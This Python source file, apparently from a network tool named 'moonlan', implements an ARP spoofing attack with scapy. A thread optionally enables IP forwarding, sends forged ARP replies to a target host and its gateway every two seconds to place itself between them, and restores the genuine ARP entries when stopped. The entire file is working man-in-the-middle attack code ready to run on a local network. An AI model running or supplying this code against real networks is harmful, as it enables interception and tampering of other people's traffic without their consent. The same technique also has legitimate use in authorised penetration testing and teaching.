from scapy.all import *
from scapy.layers.l2 import ARP

from moonlan.config import config


class ARPSpoofing(Thread):
    def __init__(self, target_ip: str, target_mac: str, gateway_ip: str, gateway_mac: str, forward: bool):
        Thread.__init__(self)
        self.daemon = True
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.target_mac = target_mac
        self.gateway_mac = gateway_mac
        self.forward = forward
        self.spoofing = False

    def run(self):
        if self.forward:
            with open(config.spoofing.ip_forward_file_path, 'w') as f:
                f.write('1\n')
        target_spoof_pkt = ARP(op=2, psrc=self.gateway_ip, hwdst=self.target_mac, pdst=self.target_ip)
        gateway_spoof_pkt = ARP(op=2, psrc=self.target_ip, hwdst=self.gateway_mac, pdst=self.gateway_ip)
        self.spoofing = True
        print("[*] Attack started *-* --> pew --> pew")
        while self.spoofing:
            send(target_spoof_pkt, verbose=False)
            send(gateway_spoof_pkt, verbose=False)
            time.sleep(2)
        send(ARP(op=2, psrc=self.target_ip, hwsrc=self.target_mac, hwdst=self.gateway_mac, pdst=self.gateway_ip),
             count=5)
        send(ARP(op=2, psrc=self.gateway_ip, hwsrc=self.gateway_mac, hwdst=self.target_mac, pdst=self.target_ip),
             count=5)
        if self.forward:
            with open(config.spoofing.ip_forward_file_path, 'w') as f:
                f.write('0\n')

    def stop(self):
        self.spoofing = False
